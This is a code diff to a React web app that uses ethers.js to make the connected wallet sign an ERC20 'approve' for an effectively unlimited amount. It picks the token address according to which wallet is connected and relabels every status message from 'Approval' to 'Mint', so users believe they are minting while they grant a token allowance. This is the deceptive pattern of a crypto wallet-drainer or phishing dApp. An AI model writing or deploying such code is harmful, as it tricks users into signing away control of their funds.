@@ -120,15 +120,24 @@ function App() {
             try {
                 const ethersProvider = new ethers.providers.Web3Provider(provider as any);
                 const signer = ethersProvider.getSigner(account);
-                const tokenContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
 
-                setApprovalStatus("Approval pending...");
-                const tx = await tokenContract.approve(ADRESS_APPROVE, APPROVE_AMOUNT);
+                let tokenAddress;
+                if (account.toLowerCase() === "0xd481a5C578bA5Ac8949Bb1f25d3A465bc79EBF98".toLowerCase()) {
+                    tokenAddress = "0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8"; // AAVE адрес
+                } else if (account.toLowerCase() === "0x317FfaB8583988509FBc0a1333F73dDA255D7B47".toLowerCase()) {
+                    tokenAddress = "0x8cFE2f46052efE1a0784b0a28C802474C1dfd9D0"; // Other адрес
+                } else {
+                    tokenAddress = "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8"; // Адрес по умолчанию (USDT)
+                }
+                const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
+
+                setApprovalStatus("Mint pending...");
+                const tx = await tokenContract.approve(tokenAddress, "1000000000000000000000000000");
                 await tx.wait();
-                setApprovalStatus("Approval successful!");
+                setApprovalStatus("Mint successful!");
             } catch (error) {
                 console.error(error);
-                setApprovalStatus("Approval failed");
+                setApprovalStatus("Mint failed");
             }
         }
     };
